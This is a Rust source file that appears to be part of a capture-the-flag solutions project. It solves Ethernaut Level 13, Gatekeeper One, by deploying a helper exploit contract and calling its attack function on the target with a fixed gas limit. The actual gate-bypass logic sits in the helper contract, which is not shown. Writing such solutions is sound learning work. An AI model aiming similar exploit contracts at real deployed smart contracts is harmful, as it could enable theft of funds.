use crate::abi::gatexploit::Gatexploit;
use async_trait::async_trait;
use ctf::ethernaut::lvl13_gatekeeper_one::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 13: Gatekeeper One
     *
     * Make it past the gatekeeper and register as
     * an entrant to pass this level.
     *
     * Things that might help:
     * Remember what you've learned from the Telephone
     * and Token levels. You can learn more about
     * the special function `gasleft()`,
     * in Solidity's documentation
     * see [here](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html)
     * and [here](https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls)
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let gatexploit =
            Gatexploit::deploy(offender.to_owned(), ())?.send().await?;

        gatexploit.attack(target.address).gas(1_000_000).send().await?.await?;

        Ok(())
    }
}
